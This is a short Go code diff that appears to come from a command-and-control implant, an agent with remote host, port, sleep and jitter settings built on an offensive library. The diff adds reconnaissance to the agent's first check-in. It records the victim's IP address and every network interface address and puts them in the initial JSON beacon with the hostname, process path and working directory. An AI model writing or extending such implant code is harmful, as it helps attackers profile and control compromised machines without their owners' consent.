@@ -5,12 +5,12 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
+	"dingo/hg"
 	"encoding/base64"
 	"encoding/json"
 	"io"
+	"net"
 	"net/http"
-
-	hg "github.com/deranged0tter/hellsgopher"
 )
 
 func GetUsername() (string, error) {
@@ -67,8 +67,28 @@ func InitAgent(rhost string, rport string, uri string, sleep int, jitter int, li
 		return err
 	}
 
+	ip := hg.GetIPFromDial(rhost + ":" + rport)
+
+	iFaces, err := net.Interfaces()
+	if err != nil {
+		return err
+	}
+
+	var interfaces = make(map[string]string)
+
+	for _, iFace := range iFaces {
+		addrs, err := iFace.Addrs()
+		if err != nil {
+			return err
+		}
+
+		interfaces[iFace.Name] = addrs[0].String()
+	}
+
 	rawJsonData := httpPostInitRequest{
 		Hostname:        hostname,
+		IP:              ip.String(),
+		Interfaces:      interfaces,
 		ProcessPath:     procPath,
 		PWD:             pwd,
 		ProcessName:     procName,
